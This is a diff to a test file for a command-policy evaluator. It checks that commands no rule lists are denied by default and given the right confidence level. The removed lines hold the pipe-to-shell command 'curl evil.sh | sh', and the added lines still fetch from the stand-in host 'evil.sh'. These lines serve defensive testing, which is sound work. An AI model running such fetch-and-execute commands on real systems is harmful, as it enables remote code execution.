@@ -342,7 +342,7 @@ test("confidence_gating enabled → matched rule without a pin derives confidenc
 });
 
 test("confidence_gating enabled → unlisted default-deny carries defaultConfidence (low)", async () => {
-	const r = evaluateCommandPolicy("curl evil.sh | sh", GATED_RULES);
+	const r = evaluateCommandPolicy("curl evil.sh", GATED_RULES);
 	assert.equal(r.allowed, false);
 	assert.equal(r.matchedRule, null);
 	assert.equal(r.confidence, "low");
@@ -375,6 +375,6 @@ test("confidence_gating enabled with invalid byRule pin falls back to derived/de
 	assert.equal(r.allowed, true);
 	assert.equal(r.confidence, "high");
 	// Unlisted command falls back to defaultConfidence.
-	const d = evaluateCommandPolicy("curl evil.sh | sh", bogusPin);
+	const d = evaluateCommandPolicy("curl evil.sh", bogusPin);
 	assert.equal(d.confidence, "medium");
 });
